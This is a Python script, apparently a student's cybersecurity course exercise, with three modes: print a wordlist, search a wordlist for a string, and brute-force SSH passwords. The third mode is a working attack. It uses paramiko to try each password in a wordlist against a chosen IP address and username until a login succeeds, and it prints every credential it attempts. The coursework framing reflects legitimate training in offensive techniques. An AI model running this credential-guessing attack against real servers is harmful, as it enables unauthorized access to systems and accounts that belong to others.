#! /usr/bin/python 3



# Script:   code challenge 10           
# Author: Raheem Sharif Reed                     
# Date of latest revision: August 1, 2023      
# Purpose:In Python, create a script that prompts the user to select one of the following modes:Mode 1: Offensive; Dictionary Iterator
#Accepts a user input word list file path and iterates through the word list, assigning the word being read to a variable.
#Add a delay between words.
#Print to the screen the value of the variable.
#Mode 2: Defensive; Password Recognized
#Accepts a user input string.
#Accepts a user input word list file path.
#Search the word list for the user input string.
#Print to the screen whether the string appeared in the word list
#Authenticate to an SSH server by its IP address.
#Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.


import paramiko
import time

def read_word_list(file_path):
    with open(file_path, 'r') as file:
        word_list = [word.strip() for word in file.readlines()]
    return word_list

def iterate_and_print(file_path, delay=0):
    word_list = read_word_list(file_path)
    for word in word_list:
        print(word)
        time.sleep(delay)

def search_word_in_list(word, file_path):
    word_list = read_word_list(file_path)
    if word in word_list:
        print(f"The word '{word}' appeared in the word list.")
    else:
        print(f"The word '{word}' did not appear in the word list.")

def ssh_authentication(ip, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password, timeout=10)
        print(f"Successful login to {ip} with username '{username}' and password '{password}'.")
        client.close()
        return True
    except paramiko.AuthenticationException:
        print(f"Failed to authenticate to {ip} with username '{username}' and password '{password}'.")
        return False
    except paramiko.SSHException as e:
        print(f"SSH error occurred: {e}")
        return False
    except Exception as e:
        print(f"Error occurred: {e}")
        return False

if __name__ == "__main__":
    print("Select one of the following modes:")
    print("1. Iterate through a word list file and print words.")
    print("2. Search for a word in a word list file.")
    print("3. SSH Authentication using a word list.")
    choice = int(input("Enter 1, 2, or 3: "))

    if choice == 1:
        file_path = input("Enter the path to the word list file: ")
        delay = float(input("Enter the delay between words (in seconds): "))
        iterate_and_print(file_path, delay)
    elif choice == 2:
        word = input("Enter the word to search: ")
        file_path = input("Enter the path to the word list file: ")
        search_word_in_list(word, file_path)
    elif choice == 3:
        ip = input("Enter the IP address of the SSH server: ")
        username = input("Enter the SSH username: ")
        file_path = input("Enter the path to the word list file: ")

        word_list = read_word_list(file_path)
        for password in word_list:
            if ssh_authentication(ip, username, password):
                break
    else:
        print("Invalid choice. Please select 1, 2, or 3.")
